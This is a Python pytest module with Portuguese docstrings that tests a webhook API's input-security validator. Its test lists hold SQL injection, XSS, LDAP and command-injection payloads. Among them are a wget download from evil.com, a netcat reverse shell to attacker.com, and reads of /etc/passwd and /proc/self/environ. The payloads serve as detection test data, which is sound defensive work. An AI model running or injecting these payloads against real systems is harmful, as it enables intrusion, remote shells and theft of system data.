"""
Testes de segurança para validação de entrada de dados.

Este módulo contém testes abrangentes para validar a segurança da entrada
de dados, incluindo testes contra injeção SQL, XSS, command injection e
outros vetores de ataque.
"""

import pytest
import json
import base64
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch

from app.api.validators.security_validator import SecurityValidator, validate_webhook_payload
from app.api.schemas.webhooks import WebhookPayload, WhatsAppPayload, CustomPayload
from app.models.integrations import IntegrationChannel


class TestSecurityValidator:
    """Testes para o validador de segurança."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.validator = SecurityValidator(strict_mode=True)
    
    def test_sql_injection_detection(self):
        """Testa detecção de SQL injection."""
        
        # Casos de SQL injection
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
        ]
        
        for payload in sql_payloads:
            result = self.validator.validate_string(payload, "test_field")
            assert not result["valid"], f"SQL injection não detectada: {payload}"
            assert any("SQL injection" in issue for issue in result["issues"])
    
    def test_xss_detection(self):
        """Testa detecção de XSS."""
        
        # Casos de XSS
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<object data='data:text/html,<script>alert(\"xss\")</script>'></object>",
            "<embed src='data:text/html,<script>alert(\"xss\")</script>'>",
            "<link rel='stylesheet' href='javascript:alert(\"xss\")'>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"xss\")'>"
        ]
        
        for payload in xss_payloads:
            result = self.validator.validate_string(payload, "test_field")
            assert not result["valid"], f"XSS não detectado: {payload}"
            assert any("XSS" in issue for issue in result["issues"])
    
    def test_command_injection_detection(self):
        """Testa detecção de command injection."""
        
        # Casos de command injection
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la",
            "`id`",
            "$(uname -a)",
            "; wget http://evil.com/shell.sh",
            "| nc -e /bin/sh attacker.com 4444",
            "../../../etc/passwd",
            "/proc/self/environ"
        ]
        
        for payload in cmd_payloads:
            result = self.validator.validate_string(payload, "test_field")
            assert not result["valid"], f"Command injection não detectada: {payload}"
            assert any("command injection" in issue.lower() for issue in result["issues"])
    
    def test_ldap_injection_detection(self):
        """Testa detecção de LDAP injection."""
        
        # Casos de LDAP injection
        ldap_payloads = [
            "admin)(|(password=*))",
            "*)(uid=*",
            "admin)(&(password=*))",
            "\\2a\\29\\28\\7c\\28\\75\\69\\64\\3d\\2a"
        ]
        
        for payload in ldap_payloads:
            result = self.validator.validate_string(payload, "test_field")
            assert not result["valid"], f"LDAP injection não detectada: {payload}"
            assert any("LDAP injection" in issue for issue in result["issues"])
    
    def test_encoded_payload_detection(self):
        """Testa detecção de payloads maliciosos codificados."""
        
        # XSS codificado em base64
        xss_payload = "<script>alert('xss')</script>"
        encoded_xss = base64.b64encode(xss_payload.encode()).decode()
        
        result = self.validator.validate_string(encoded_xss, "test_field")
        assert not result["valid"], "Payload XSS codificado não detectado"
        assert any("codificado" in issue for issue in result["issues"])
        
        # SQL injection codificado
        sql_payload = "'; DROP TABLE users; --"
        encoded_sql = base64.b64encode(sql_payload.encode()).decode()
        
        result = self.validator.validate_string(encoded_sql, "test_field")
        assert not result["valid"], "Payload SQL codificado não detectado"
    
    def test_dangerous_characters_detection(self):
        """Testa detecção de caracteres perigosos."""
        
        dangerous_strings = [
            "Hello<script>",
            "Test>alert",
            'String with "quotes"',
            "String with 'quotes'",
            "String with & ampersand",
            "String with \\x00 null byte",
            "String with \\x08 backspace"
        ]
        
        for dangerous_str in dangerous_strings:
            result = self.validator.validate_string(dangerous_str, "test_field")
            assert not result["valid"], f"Caracteres perigosos não detectados: {dangerous_str}"
    
    def test_string_sanitization(self):
        """Testa sanitização de strings."""
        
        test_cases = [
            ("Hello <script>alert('xss')</script>", "Hello &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"),
            ("Test & Development", "Test &amp; Development"),
            ("Quote: \"Hello World\"", "Quote: &quot;Hello World&quot;"),
            ("  Multiple   spaces  ", "Multiple spaces"),
            ("String with\x00null\x08byte", "String withnullbyte")
        ]
        
        for input_str, expected in test_cases:
            sanitized = self.validator.sanitize_string(input_str)
            assert sanitized == expected, f"Sanitização incorreta: {input_str} -> {sanitized}"
    
    def test_url_validation(self):
        """Testa validação de URLs."""
        
        # URLs válidas
        valid_urls = [
            "https://example.com",
            "http://api.example.com/webhook",
            "https://subdomain.example.com:8080/path"
        ]
        
        for url in valid_urls:
            result = self.validator.validate_url(url, "test_url")
            assert result["valid"], f"URL válida rejeitada: {url}"
        
        # URLs inválidas
        invalid_urls = [
            "ftp://example.com",  # Esquema não permitido
            "javascript:alert('xss')",  # Esquema perigoso
            "https://localhost/test",  # Localhost em modo strict
            "http://192.168.1.1/test",  # IP privado em modo strict
            "https://example.com<script>",  # Caracteres suspeitos
            "not-a-url"  # Formato inválido
        ]
        
        for url in invalid_urls:
            result = self.validator.validate_url(url, "test_url")
            assert not result["valid"], f"URL inválida aceita: {url}"
    
    def test_email_validation(self):
        """Testa validação de emails."""
        
        # Emails válidos
        valid_emails = [
            "user@example.com",
            "test.email+tag@domain.co.uk",
            "user123@subdomain.example.org"
        ]
        
        for email in valid_emails:
            result = self.validator.validate_email(email, "test_email")
            assert result["valid"], f"Email válido rejeitado: {email}"
        
        # Emails inválidos
        invalid_emails = [
            "invalid-email",  # Formato inválido
            "user@",  # Domínio ausente
            "@domain.com",  # Usuário ausente
            "user<script>@domain.com",  # Caracteres perigosos
            "a" * 255 + "@domain.com"  # Muito longo
        ]
        
        for email in invalid_emails:
            result = self.validator.validate_email(email, "test_email")
            assert not result["valid"], f"Email inválido aceito: {email}"
    
    def test_phone_validation(self):
        """Testa validação de telefones."""
        
        # Telefones válidos
        valid_phones = [
            "+5511999999999",
            "+1234567890",
            "11999999999",
            "+44 20 7946 0958",
            "(11) 99999-9999"
        ]
        
        for phone in valid_phones:
            result = self.validator.validate_phone(phone, "test_phone")
            assert result["valid"], f"Telefone válido rejeitado: {phone}"
        
        # Telefones inválidos
        invalid_phones = [
            "123",  # Muito curto
            "+0123456789",  # Começa com 0
            "phone<script>",  # Caracteres perigosos
            "++5511999999999",  # Múltiplos +
            "abc123def456"  # Letras misturadas
        ]
        
        for phone in invalid_phones:
            result = self.validator.validate_phone(phone, "test_phone")
            assert not result["valid"], f"Telefone inválido aceito: {phone}"
    
    def test_dict_validation_depth_limit(self):
        """Testa limite de profundidade em dicionários."""
        
        # Criar dicionário com profundidade excessiva
        deep_dict = {}
        current = deep_dict
        
        for i in range(15):  # Mais que o limite de 10
            current["level"] = {}
            current = current["level"]
        
        current["value"] = "deep value"
        
        result = self.validator.validate_dict(deep_dict, "test_dict", max_depth=10)
        assert not result["valid"], "Profundidade excessiva não detectada"
        assert any("profundidade" in issue.lower() for issue in result["issues"])
    
    def test_dict_validation_malicious_content(self):
        """Testa validação de conteúdo malicioso em dicionários."""
        
        malicious_dict = {
            "normal_field": "normal value",
            "xss_field": "<script>alert('xss')</script>",
            "sql_field": "'; DROP TABLE users; --",
            "nested": {
                "cmd_field": "; cat /etc/passwd",
                "safe_field": "safe value"
            }
        }
        
        result = self.validator.validate_dict(malicious_dict, "test_dict")
        assert not result["valid"], "Conteúdo malicioso em dict não detectado"
        assert len(result["issues"]) >= 3  # Pelo menos 3 problemas detectados
    
    def test_file_upload_validation(self):
        """Testa validação de upload de arquivos."""
        
        # Arquivo seguro
        safe_content = b"This is a safe text file content"
        result = self.validator.validate_file_upload("document.txt", safe_content, "test_file")
        assert result["valid"], "Arquivo seguro rejeitado"
        
        # Arquivo com extensão perigosa
        result = self.validator.validate_file_upload("malware.exe", safe_content, "test_file")
        assert not result["valid"], "Arquivo com extensão perigosa aceito"
        assert any("extensão" in issue.lower() for issue in result["issues"])
        
        # Arquivo muito grande
        large_content = b"x" * (11 * 1024 * 1024)  # 11MB
        result = self.validator.validate_file_upload("large.txt", large_content, "test_file")
        assert not result["valid"], "Arquivo muito grande aceito"
        
        # Arquivo executável (magic bytes)
        exe_content = b"MZ" + b"\\x00" * 100  # Assinatura de executável Windows
        result = self.validator.validate_file_upload("file.txt", exe_content, "test_file")
        assert not result["valid"], "Arquivo executável aceito"
        
        # Nome de arquivo com path traversal
        result = self.validator.validate_file_upload("../../../etc/passwd", safe_content, "test_file")
        assert not result["valid"], "Path traversal não detectado"


class TestWebhookPayloadValidation:
    """Testes para validação de payloads de webhook."""
    
    def test_whatsapp_payload_validation(self):
        """Testa validação de payload do WhatsApp."""
        
        # Payload válido
        valid_payload = {
            "channel": "whatsapp",
            "payload": {
                "message": "Olá, como você está?",
                "phone": "+5511999999999",
                "message_type": "text"
            }
        }
        
        webhook_payload = WebhookPayload(**valid_payload)
        assert webhook_payload.channel == IntegrationChannel.WHATSAPP
        assert isinstance(webhook_payload.payload, WhatsAppPayload)
        
        # Payload com XSS
        xss_payload = {
            "channel": "whatsapp",
            "payload": {
                "message": "<script>alert('xss')</script>",
                "phone": "+5511999999999"
            }
        }
        
        with pytest.raises(ValueError, match="caracteres não permitidos"):
            WebhookPayload(**xss_payload)
        
        # Telefone inválido
        invalid_phone_payload = {
            "channel": "whatsapp",
            "payload": {
                "message": "Teste",
                "phone": "invalid-phone"
            }
        }
        
        with pytest.raises(ValueError):
            WebhookPayload(**invalid_phone_payload)
    
    def test_telegram_payload_validation(self):
        """Testa validação de payload do Telegram."""
        
        # Payload válido
        valid_payload = {
            "channel": "telegram",
            "payload": {
                "message": "Olá do Telegram!",
                "chat_id": 123456789,
                "user_id": 987654321,
                "username": "testuser"
            }
        }
        
        webhook_payload = WebhookPayload(**valid_payload)
        assert webhook_payload.channel == IntegrationChannel.TELEGRAM
        
        # Chat ID inválido (negativo)
        invalid_payload = {
            "channel": "telegram",
            "payload": {
                "message": "Teste",
                "chat_id": -123,  # Inválido
                "user_id": 123
            }
        }
        
        with pytest.raises(ValueError):
            WebhookPayload(**invalid_payload)
    
    def test_zapier_payload_validation(self):
        """Testa validação de payload do Zapier."""
        
        # Payload válido
        valid_payload = {
            "channel": "zapier",
            "payload": {
                "trigger_event": "new_contact",
                "data": {
                    "name": "João Silva",
                    "email": "joao@example.com",
                    "company": "Empresa XYZ"
                },
                "user_email": "user@zapier.com"
            }
        }
        
        webhook_payload = WebhookPayload(**valid_payload)
        assert webhook_payload.channel == IntegrationChannel.ZAPIER
        
        # Payload com profundidade excessiva
        deep_data = {"level1": {"level2": {"level3": {}}}}
        current = deep_data["level1"]["level2"]["level3"]
        
        for i in range(15):  # Criar profundidade excessiva
            current[f"level{i+4}"] = {}
            current = current[f"level{i+4}"]
        
        invalid_payload = {
            "channel": "zapier",
            "payload": {
                "trigger_event": "test",
                "data": deep_data
            }
        }
        
        with pytest.raises(ValueError, match="profundidade"):
            WebhookPayload(**invalid_payload)
    
    def test_custom_payload_validation(self):
        """Testa validação de payload customizado."""
        
        # Payload válido
        valid_payload = {
            "channel": "custom",
            "payload": {
                "message": "Mensagem customizada",
                "data": {
                    "custom_field": "custom_value",
                    "number": 42
                },
                "user_id": "user123"
            }
        }
        
        webhook_payload = WebhookPayload(**valid_payload)
        assert webhook_payload.channel == IntegrationChannel.CUSTOM
        assert isinstance(webhook_payload.payload, CustomPayload)
        
        # Payload com conteúdo malicioso
        malicious_payload = {
            "channel": "custom",
            "payload": {
                "message": "'; DROP TABLE users; --",
                "data": {
                    "xss": "<script>alert('xss')</script>"
                }
            }
        }
        
        with pytest.raises(ValueError):
            WebhookPayload(**malicious_payload)
    
    def test_payload_size_validation(self):
        """Testa validação de tamanho de payload."""
        
        # Criar payload muito grande
        large_data = {"big_field": "x" * (2 * 1024 * 1024)}  # 2MB
        
        large_payload = {
            "channel": "custom",
            "payload": {
                "data": large_data
            }
        }
        
        with pytest.raises(ValueError, match="tamanho máximo"):
            WebhookPayload(**large_payload)
    
    def test_channel_payload_mismatch(self):
        """Testa incompatibilidade entre canal e payload."""
        
        # Payload do WhatsApp com canal Telegram
        mismatched_payload = {
            "channel": "telegram",
            "payload": {
                "message": "Teste",
                "phone": "+5511999999999"  # Campo do WhatsApp
            }
        }
        
        with pytest.raises(ValueError, match="deve ser do tipo"):
            WebhookPayload(**mismatched_payload)


class TestWebhookPayloadFunction:
    """Testes para função de validação de payload."""
    
    def test_validate_webhook_payload_success(self):
        """Testa validação bem-sucedida de payload."""
        
        safe_payload = {
            "message": "Mensagem segura",
            "user_id": "user123",
            "data": {
                "field1": "value1",
                "field2": 42
            }
        }
        
        result = validate_webhook_payload(safe_payload)
        assert result["valid"], "Payload seguro rejeitado"
        assert len(result["issues"]) == 0
    
    def test_validate_webhook_payload_malicious(self):
        """Testa detecção de payload malicioso."""
        
        malicious_payload = {
            "message": "<script>alert('xss')</script>",
            "sql_field": "'; DROP TABLE users; --",
            "cmd_field": "; cat /etc/passwd",
            "nested": {
                "xss": "javascript:alert('hack')"
            }
        }
        
        result = validate_webhook_payload(malicious_payload)
        assert not result["valid"], "Payload malicioso não detectado"
        assert len(result["issues"]) > 0
        
        # Verificar se diferentes tipos de ataques foram detectados
        issues_text = " ".join(result["issues"]).lower()
        assert "xss" in issues_text or "script" in issues_text
        assert "sql" in issues_text or "injection" in issues_text


class TestSecurityHeaders:
    """Testes para headers de segurança."""
    
    def test_security_headers_generation(self):
        """Testa geração de headers de segurança."""
        
        validator = SecurityValidator()
        headers = validator.get_security_headers()
        
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "Referrer-Policy"
        ]
        
        for header in expected_headers:
            assert header in headers, f"Header de segurança ausente: {header}"
        
        # Verificar valores específicos
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-XSS-Protection"] == "1; mode=block"


class TestEdgeCases:
    """Testes para casos extremos e edge cases."""
    
    def setup_method(self):
        """Setup para cada teste."""
        self.validator = SecurityValidator(strict_mode=True)
    
    def test_empty_string_validation(self):
        """Testa validação de string vazia."""
        
        result = self.validator.validate_string("", "empty_field")
        assert result["valid"], "String vazia rejeitada incorretamente"
    
    def test_none_value_validation(self):
        """Testa validação de valores None."""
        
        result = self.validator.validate_string(None, "none_field")
        assert not result["valid"], "Valor None aceito incorretamente"
    
    def test_unicode_string_validation(self):
        """Testa validação de strings Unicode."""
        
        unicode_strings = [
            "Olá, como está? 😊",
            "测试中文字符",
            "Тест кириллицы",
            "🚀 Emoji test 🎉"
        ]
        
        for unicode_str in unicode_strings:
            result = self.validator.validate_string(unicode_str, "unicode_field")
            assert result["valid"], f"String Unicode rejeitada: {unicode_str}"
    
    def test_very_long_string_validation(self):
        """Testa validação de strings muito longas."""
        
        long_string = "a" * 100000  # 100KB
        result = self.validator.validate_string(long_string, "long_field")
        assert not result["valid"], "String muito longa aceita"
        assert any("muito longa" in issue for issue in result["issues"])
    
    def test_nested_list_validation(self):
        """Testa validação de listas aninhadas."""
        
        nested_data = {
            "list_field": [
                {"item": "safe"},
                {"item": "<script>alert('xss')</script>"},
                [
                    {"nested_item": "safe"},
                    {"nested_item": "'; DROP TABLE users; --"}
                ]
            ]
        }
        
        result = self.validator.validate_dict(nested_data, "nested_list")
        assert not result["valid"], "Conteúdo malicioso em lista aninhada não detectado"
        assert len(result["issues"]) >= 2  # XSS e SQL injection